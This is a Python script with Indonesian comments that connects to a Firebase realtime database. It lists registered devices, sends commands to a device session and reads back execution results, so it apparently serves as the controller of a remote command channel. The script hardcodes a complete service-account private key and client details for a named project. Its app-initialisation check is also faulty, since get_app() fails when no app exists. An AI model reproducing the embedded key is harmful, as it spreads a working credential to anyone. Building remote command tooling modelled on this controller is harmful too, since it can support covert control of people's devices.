import firebase_admin
from firebase_admin import credentials, db
import json

# Load dari google-services.json
SERVICE_ACCOUNT = {
    "type": "service_account",
    "project_id": "riski-9d735",
    "private_key_id": "a242ec6c43ba2255eefee12fc08ef6e6ccb6eca4",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCiyNF7Mdeu898y\nVm8qyQwAH4BdpHH7LL4PcYBvyMZEcajBFEFNWrnvRpZGQiVndDq9Lb2wjelC3ct/\n+W5zhG556i7XWBD2hR6SN3M9TVon0aSRL4QEK+JvLxU6AC5Qi9UwXEj2qp7Jy86P\nr4dx7WN4oN7BkjDR2klfI7HjttiGUjzTplURonW97m+RIBZDDocsIiJmfJgoRVS1\nbVX58ObGrnPGj2jWvmXxFLw0EmDWMHgD2B5965SJmObqoJBAae5bbtvzu9oaD/lY\n//+IJPPRixoM+Ssib0EBbr4IMTPvA+vY+c4vFi4t5s/xm000WpKutTURnGZRKBEo\nCIleb7DHAgMBAAECggEABhuY2JF/MT5PQplBpI5Ul/CWpWzVJgKAwx2UHx2eatUE\n6vGynY9o6JRycQJsWtxek9iShHxeozalOxEF1unCJ2rlBQl14XoPMpdICKXNWy8f\niJ8KyglHfrp6hmmZU0Zb4mukBTVTreiqwHNqlpi8obsPgJ3WnRkepaY2N4AV0bxW\n3jGlrRviU3RxgPIG/7TFrUwRLbzVMR0KWBTV4Nhr/4bvtmb7ccdYkthjxRYUIjwW\nztdYHFBAFGy93YUbMxQHSmyWf/AcuIwH+xm8gvxlWEK2czULSJ2Eiy+/VUay7/wC\nWnb8Lbw9OaE2iGFD/0uBo0IskK7xYp60WV4xUJyFOQKBgQDS0KOghMzTZVHHIfPb\ned8WuLsFFxSjewNgIkI3GJFQtFJ1BRRIeUEY4UIPABOCzJdpOD/XsZhhguWPTvxg\nbdfMZIvbbAt3sCtGimMvBmMXtArDV/FXStVlDrl2UuBThsOYZRl9EvqPe2Eo9Jqf\n7t0MgtxBiOfvshWz6MY7icufJQKBgQDFrMGMLo8bszWYkckFaBO08jtxqFAEtwUB\nQ2dMgzqk9uG/hwEg6R6G0kygWS18CjMHM+UCOh7lgAEUiRz7BVn6+yryu63ROCfl\nmQbWDa/rPx88laSP5UJ/HXdIOfIDNkkJLLxVMvfPpDa41UE/I5pebT8ZVv4qCzrd\nf/UW4eEyewKBgQCZy5IDsb5H3lu5naBslk1VIzF09jCdT0nYIUYTMb4ZlWOucSUp\n9iOyhesOTGzveFhhb6LLtYlIYhkc4m+l3ZyYRSXuzrTS/Vek36KaFNvH2BYeCpNL\nrpFdZ0+P7cgvx1n8XI0qvOTENitcmI4RbU4gKXuL59fk+xNwK7oqh01gbQKBgH/r\n4zi/bJcFazq3pToddxtS4ssTm+zhL5j4sKGgDtRwe/jA+ib9FWc0MqhV7Yxm4UzY\n9Wtyh0oHgytx69I6TVeRMOLyN3K8f30igX0GUIDRUXqYcG06dMTkIawY65fOioco\nbxxHpny2DT+hqd6dQKm40uuoE0TMDaUHyGitdll/AoGBALTy8mtH65EWQi48Ip3U\nOr8C67vsSx1VcWtn2O55zczq/tT3KUoXfmW1fMhK/He8ynf+jB9fFFYVwcIHiDQG\nAr+P2Q2+VLyD+WqWxFdP+64fVzqIYLQqv+Eq1xQE3KWqdgaKsTza78lWaNPw8E51\nBievWpuGOPCka1zy+Be1RFuo\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-fbsvc@riski-9d735.iam.gserviceaccount.com",
    "client_id": "112433744247466839557",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40riski-9d735.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}

# Inisialisasi Firebase
if not firebase_admin.get_app():
    cred = credentials.Certificate(SERVICE_ACCOUNT)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://riski-9d735-default-rtdb.asia-southeast1.firebasedatabase.app'
    })

def get_devices():
    """Ambil semua device yang register"""
    ref = db.reference('devices')
    devices = ref.get()
    return devices if devices else {}

def send_command(session_id, command):
    """Kirim command ke device via Firebase"""
    ref = db.reference(f'commands/{session_id}')
    ref.set(command)

def get_results(session_id):
    """Ambil hasil eksekusi dari device"""
    ref = db.reference(f'results/{session_id}')
    return ref.get()
